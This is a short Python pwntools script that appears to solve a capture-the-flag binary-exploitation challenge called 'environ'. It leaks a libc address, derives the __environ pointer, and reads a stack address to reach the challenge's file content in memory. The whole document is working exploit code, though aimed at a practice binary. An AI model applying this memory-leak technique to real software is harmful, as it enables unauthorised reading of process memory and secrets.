#! /bin/usr/python3

from pwn import *

p = process('./environ', env = {"LD_PRELOAD":"./libc.so.6"})
e = ELF('./environ')
libc = ELF('./libc.so.6')

p.recvuntil(b"stdout: ")
stdout = int(p.recvuntil(b'\n'), 16)
lb = stdout - libc.symbols['_IO_2_1_stdout_']
environ = lb + libc.symbols['__environ']

p.sendlineafter(b">", b'1')
p.sendlineafter(b":", str(environ).encode())
p.recv(1)
stack_environ = u64(p.recv(6).ljust(8, b'\x00'))
file_content = stack_environ - 0x1568
p.sendlineafter(b">", b'1')
p.sendlineafter(b":", str(file_content).encode())
p.interactive()